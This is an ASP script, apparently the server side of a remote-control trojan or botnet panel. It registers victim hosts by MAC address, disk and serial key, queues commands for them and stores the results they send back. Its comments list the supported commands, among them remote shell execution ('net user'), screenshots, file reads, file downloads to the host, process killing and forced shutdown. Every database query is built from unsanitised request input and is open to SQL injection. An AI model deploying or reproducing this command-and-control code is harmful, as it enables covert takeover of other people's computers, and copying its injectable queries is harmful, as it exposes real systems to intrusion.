<!--#include file="plugins/include/conn.asp"-->
<%
'### 获取主机信息
dim HOST,MAC,DISK,SERKEY,macMD5,cmdMD5,cmdBACK
    HOST = request("HOST") 
	MAC  = request("MAC") 
	DISK = request("DISK") 
	SERKEY = request("SERKEY") 

	cmdMD5  = request("cmdMD5")
	cmdBACK = request("cmdBACK")

    macMD5 = md5(HOST&MAC)
	cmdMD5 = md5(cmdMD5) '//回调cmdKEY

if HOST<>"" and MAC<>"" and DISK<>"" then
   '### 新增或更新主机信息
   set rs=conn.execute("select top 1 * from host where macMD5='"&macMD5&"'")
	  if not rs.eof then
		 conn.execute("update host set ip='"&IP&"',disk='"&DISK&"',serkey='"&SERKEY&"',agent='"&AGENT&"',update_time='"&now()&"' where macMD5='"&macMD5&"'")
	  else
		 conn.execute("insert into host (ip,mac,disk,serkey,host,macMD5,agent,update_time) values('"&IP&"','"&MAC&"','"&DISK&"','"&SERKEY&"','"&HOST&"','"&macMD5&"','"&AGENT&"','"&now()&"')")
	  end if
   set rs=nothing

   '### 更新回调结果
   if cmdMD5<>"" then
	 set rs=conn.execute("select top 1 * from cmd where (macMD5='"&macMD5&"') order by updatetime desc,id desc")
		 if not rs.eof then
		    if cmdBACK<>"" then
		       conn.execute("update cmd set cmdBACK='"&cmdBACK&"',ok=true where id="&rs("id"))
			else
			   conn.execute("update cmd set ok=true where id="&rs("id"))
			end if
		 end if
	 set rs=nothing
   end if
end if

'### 获取当前主机的命令
set rs=conn.execute("select top 1 * from cmd where macMD5='"&macMD5&"' order by running desc,updatetime desc,id desc")
  if not rs.eof then
     if rs("running")=false then
	    conn.execute("update cmd set running=true where id="&rs("id"))
		response.Write rs("CMD")&"|"&rs("KEY1")&"|"&rs("KEY2")&"|"&rs("cmdMD5")
	 elseif rs("running")=true and rs("ok")=false and (cmdMD5<>"" and cmdBACK<>"") then
	    conn.execute("update cmd set ok=true where id="&rs("id"))
	 end if
  end if
set rs=nothing


'OPEN_MSG|测试,提示内容!|0
'OPEN_WEB|http://www.baidu.com|0
'TASK_KILL|notepad.exe|0
'TASK_LIST|0|0
'GET_SCREEN|0|0
'TO_BLACK|0|0
'TO_LINE|0|0
'GET_RPATH|c:\|0
'GET_RFILE|c:\1.txt|0
'RUN_CMD|net user|0
'CREATE_PATH|c:\test|0
'CREATE_FILE|c:\test.txt|0
'CREATE_DOWN|c:\test.txt|http://www.baidu.com
'SYS_LOGOFF|0|0
'SYS_SHUTDOWN|0|0
'SYS_REBOOT|0|0

%>